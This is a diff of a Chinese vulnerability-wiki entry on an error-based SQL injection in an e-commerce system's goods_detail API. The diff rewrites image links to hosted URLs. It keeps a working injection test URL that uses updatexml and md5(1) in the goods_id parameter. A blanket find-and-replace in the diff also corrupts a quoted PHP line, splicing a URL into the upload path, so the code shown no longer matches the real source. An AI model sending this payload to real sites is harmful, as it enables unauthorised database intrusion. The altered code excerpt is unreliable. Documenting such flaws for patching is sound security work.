@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](image/szy-1.png)
+![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-1.png)
 
 存在漏洞的文件为 **ApiController.class.php  **, 关键位置为
 
@@ -47,7 +47,7 @@ public function goods_detail()
 		$default_image = '';
 		foreach($goods_image as $val)
 		{
-			$val['img_url'] = str_replace('http','https',C('SITE_URL')).'/Uploads/image/'.$val['image'];
+			$val['img_url'] = str_replace('http','https',C('SITE_URL')).'/Uploads/ http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/'.$val['image'];
 			
 			if(empty($default_image))
 			{
@@ -60,7 +60,7 @@ public function goods_detail()
 		$goods = $goods_arr[0];
 ```
 
-![](image/szy-8.png)
+![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-8.png)
 
 漏洞测试为
 
@@ -68,4 +68,4 @@ public function goods_detail()
 https://xxx.xxx.xx.xxx/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
 ```
 
-![](image/szy-9.png)
+![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-9.png)
